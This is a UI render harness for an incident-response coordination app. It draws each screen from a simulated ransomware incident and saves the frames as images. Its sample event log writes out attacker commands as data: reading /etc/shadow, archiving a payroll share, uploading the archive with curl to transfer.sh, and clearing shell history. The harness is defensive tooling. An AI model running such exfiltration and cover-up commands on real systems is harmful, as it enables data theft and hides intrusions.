// Draws every page of the station from a sample incident and writes each
// frame to build/ui-*.ppm. Run with SDL_VIDEODRIVER=offscreen; it's how the
// layout gets checked without clicking through a real window.

#include "../src/util.HC"
#include "../src/crypto.HC"
#include "../src/link.HC"
#include "../src/log.HC"
#include "../src/events.HC"
#include "../src/station.HC"
#include "../src/team.HC"
#include "../src/deadlines.HC"
#include "../src/sdl2.HC"
#include "../src/canvas.HC"
#include "../src/app.HC"

extern "c" I32 system(U8 *command);
extern "c" I32 setenv(U8 *name, U8 *value, I32 overwrite);
extern "c" U0 SDL_SetWindowSize(U0 *window, I32 w, I32 h);

U8 *g_events[11] = {
  "shell|dana|ws-dana|ls -la /srv/shares",
  "login|marcus|fs-01|ssh from 10.0.4.22",
  "shell|marcus|fs-01|df -h /srv",
  "fail|admin|fs-01|ssh password from 185.220.101.7",
  "fail|admin|fs-01|ssh password from 185.220.101.7",
  "login|svc-backup|fs-01|ssh from 185.220.101.7",
  "sudo|svc-backup|fs-01|cat /etc/shadow",
  "shell|svc-backup|fs-01|tar czf /tmp/.p.tgz /srv/shares/payroll",
  "shell|svc-backup|fs-01|curl -T /tmp/.p.tgz https://transfer.sh/p.tgz",
  "request|-|fs-01|GET /.env 404 from 185.220.101.7",
  "shell|svc-backup|fs-01|history -c"
};

U0 Resize(App *a, I64 w, I64 h)
{
  SDL_SetWindowSize(a->cv->window, w, h);
  CanvasResize(a->cv);
}

U0 Note(App *a, I64 kind, I64 phase, U8 *text)
{
  U8 *msg = MAlloc(MSG_MAX);
  Post(a->st, kind, phase, text, StrLen(text), msg);
  Free(msg);
}

U0 Shot(App *a, U8 *name)
{
  Draw(a);
  U8 path[128];
  snprintf(path, 128, "build/ui-%s.ppm", name);
  CanvasDump(a->cv, path);
}

I32 Main(I32 argc, U8 **argv)
{
  CryptoInit();
  system("rm -rf build/tmp-ui build/tmp-ui-b");
  App *a = AppNew("build/tmp-ui", "/nonexistent", NULL);
  if (!CanvasOpen(a->cv, "render", "assets/fonts")) {
    "canvas: %s\n", SDL_GetError();
    return 1;
  }
  Shot(a, "setup-name");
  a->mode = MODE_NEW_PASS;
  a->fields[FLD_SETUP].len = 5;
  StrCpy(a->fields[FLD_SETUP].text, "hunte");
  Shot(a, "setup-pass");
  ClearField(a, FLD_SETUP);
  StationCreate(a->st, a->st->dir, "Dana Kessler", "correct horse battery");
  a->mode = MODE_NEW_CHOICE;
  Shot(a, "setup-choice");
  a->mode = MODE_READY;
  Shot(a, "setup-joinwait");

  U8 *msg = MAlloc(MSG_MAX);
  StartIncident(a->st, "Ransomware on FS-01, Brightline Health", msg);
  a->link.fd = 5;
  Note(a, KIND_NOTE, PHASE_DETECT, "Ransom note found on FS-01 by night shift. Shares show .lck extension since 02:10.");
  Note(a, KIND_CHAT, PHASE_DETECT, "Pulling FS-01 and NAS-02 off the switch now. Don't log in from the domain.");
  Note(a, KIND_SCOPE, PHASE_DETECT, "FS-01|PII|TX|4120|ENCRYPTED");
  Note(a, KIND_NOTE, PHASE_CONTAIN, "Moved the response to CONTAIN: stopping the spread: isolate, block, reset passwords.");
  Note(a, KIND_SCOPE, PHASE_CONTAIN, "HR-DB|PII|TX|?|EXFILTRATED");
  Note(a, KIND_SCOPE, PHASE_CONTAIN, "imaging-archive|PHI|EU|412|EXFILTRATED");
  Note(a, KIND_SCOPE, PHASE_CONTAIN, "NAS-02|OTHER|-|0|CLEAN");
  Note(a, KIND_NOTE, PHASE_CONTAIN, "Carrier confirmed coverage; forensic firm statement of work signed. Claim number A-55102.");
  Note(a, KIND_CHAT, PHASE_CONTAIN, "Draft EU notice sent to Priya for review. Need the imaging-archive count confirmed by 16:00.");
  I64 picked = -1;
  for (I64 i = 0; i < 11; i++) {
    if (i == 6)
      picked = a->st->log->count;
    Note(a, KIND_EVENT, PHASE_CONTAIN, g_events[i]);
  }
  Free(msg);

  a->team.peer_count = 1;
  MemSet(a->team.peers[0].pk, 7, PK_BYTES);
  StrCpy(a->team.peers[0].name, "Marcus Hale");
  a->team.peers[0].heard = time(NULL);
  a->team.join_pending = TRUE;
  MemSet(a->team.join_pk, 9, PK_BYTES);
  StrCpy(a->team.join_name, "Priya Shah");

  U8 *names[VIEWS] = {"overview", "server", "log", "scope", "clocks", "team", "network", "report", "guide"};
  for (I64 v = 0; v < VIEWS; v++) {
    a->view = v;
    Shot(a, names[v]);
  }
  // A member's alert arriving, then the manager cutting the internet.
  a->team.join_pending = FALSE;
  Station *b = MAlloc(sizeof(Station));
  StationInit(b, "build/tmp-ui-b");
  StationCreate(b, b->dir, "Marcus Hale", "another passphrase");
  MemCpy(b->keys[0], a->st->keys[0], KEY_BYTES);
  b->have_key[0] = TRUE;
  b->epoch = 0;
  a->team.join_pending = TRUE;
  MemCpy(a->team.join_pk, b->pk, PK_BYTES);
  StrCpy(a->team.join_name, "Marcus Hale");
  Approve(a);
  U8 *m2 = MAlloc(MSG_MAX);
  for (I64 i = 0; i < a->st->log->count; i++)
    StationReceive(b, m2, MakeMessage(a->st, &a->st->log->entries[i], m2));
  U8 *alert = "Payroll share files rewritten at 03:12 from an admin account nobody on shift used. Looks like tampering.";
  StationReceive(a->st, m2, Post(b, KIND_ALERT, PHASE_CONTAIN, alert, StrLen(alert), m2));
  a->team.join_pending = FALSE;
  a->view = V_OVERVIEW;
  Shot(a, "alert");
  a->alerts_acked = AlertCount(a);
  setenv("ARK_CUT_CMD", "true", 1);
  CutNetwork(a, "panel button");
  Shot(a, "cut");
  a->view = V_NETWORK;
  Shot(a, "cut-network");
  // The same moment on the member's station, then the member asking for a phase.
  for (I64 i = 0; i < a->st->log->count; i++)
    StationReceive(b, m2, MakeMessage(a->st, &a->st->log->entries[i], m2));
  Station *mgr = a->st;
  a->st = b;
  a->view = V_OVERVIEW;
  Shot(a, "member-overview");
  a->view = V_NETWORK;
  Shot(a, "member-network");
  a->st = mgr;
  U8 *ask = "Asks to move the response to ERADICATE.";
  StationReceive(a->st, m2, Post(b, KIND_ALERT, PHASE_CONTAIN, ask, StrLen(ask), m2));
  a->view = V_OVERVIEW;
  Shot(a, "phase-ask");
  a->alerts_acked = AlertCount(a);
  a->view = V_OVERVIEW;
  OpenScope(a);
  StrCpy(a->fields[FLD_ASSET].text, "Payroll share");
  a->fields[FLD_ASSET].len = 13;
  a->scope_type = 0;
  a->scope_status = 1;
  StrCpy(a->scope_error, "Pick what kind of data it holds.");
  Shot(a, "scope-form");
  a->scope_open = FALSE;
  a->view = V_LOG;
  a->focus = FLD_SEARCH;
  StrCpy(a->fields[FLD_SEARCH].text, "fs-01");
  a->fields[FLD_SEARCH].len = 5;
  Shot(a, "log-search");
  a->fields[FLD_SEARCH].len = 0;
  a->fields[FLD_SEARCH].text[0] = 0;
  a->focus = -1;
  a->view = V_SERVER;
  a->selected = picked;
  Shot(a, "server-picked");
  Resize(a, 1366, 768);
  a->view = V_OVERVIEW;
  Shot(a, "small-overview");
  Resize(a, 2560, 1440);
  a->view = V_SERVER;
  Shot(a, "big-server");
  Resize(a, 1920, 1080);
  Shot(a, "fhd-server");
  "rendered\n";
  return 0;
}
